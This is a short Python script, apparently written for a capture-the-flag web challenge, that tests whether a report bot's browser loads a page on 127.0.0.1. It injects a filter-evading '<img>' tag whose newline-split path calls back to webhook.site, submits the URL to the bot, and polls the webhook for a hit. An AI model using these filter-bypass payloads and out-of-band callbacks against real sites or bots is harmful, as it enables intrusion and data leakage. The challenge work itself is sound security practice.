"""Reachability probe: does the bot browser load 127.0.0.1:<port> and fire an <img>?"""
import requests, urllib.parse, time, sys, urllib3
urllib3.disable_warnings()
BOT = "https://bot-9cf8d8cc310eff6b.chal.ctf.ae"
port = sys.argv[1] if len(sys.argv) > 1 else "9000"
wh = requests.post("https://webhook.site/token", timeout=15).json()
uuid = wh["uuid"]
print(f"[*] webhook {uuid}, probing port {port}")
payload = f'<img src="/\n/webhook.site/{uuid}/p{port}">'
bad = __import__("re").search(r"http|data|\\\\|\*|\[|\]|&|%|@|//", payload, __import__("re").I)
print(f"[*] filter check: {'FAIL '+str(bad) if bad else 'ok'}, payload={payload!r}")
url = f"http://127.0.0.1:{port}/?content=" + urllib.parse.quote(payload, safe="")
r = requests.post(f"{BOT}/api/report", json={"url": url}, verify=False, timeout=40)
print(f"[*] report -> {r.status_code} {r.text[:60]!r}")
deadline = time.time() + 40
while time.time() < deadline:
    d = requests.get(f"https://webhook.site/token/{uuid}/requests", timeout=10).json()
    for req in d.get("data", []):
        u = req.get("url", "")
        if f"p{port}" in u:
            print(f"[+] HIT: {u}")
            sys.exit(0)
    time.sleep(2)
print("[-] no hit")
sys.exit(1)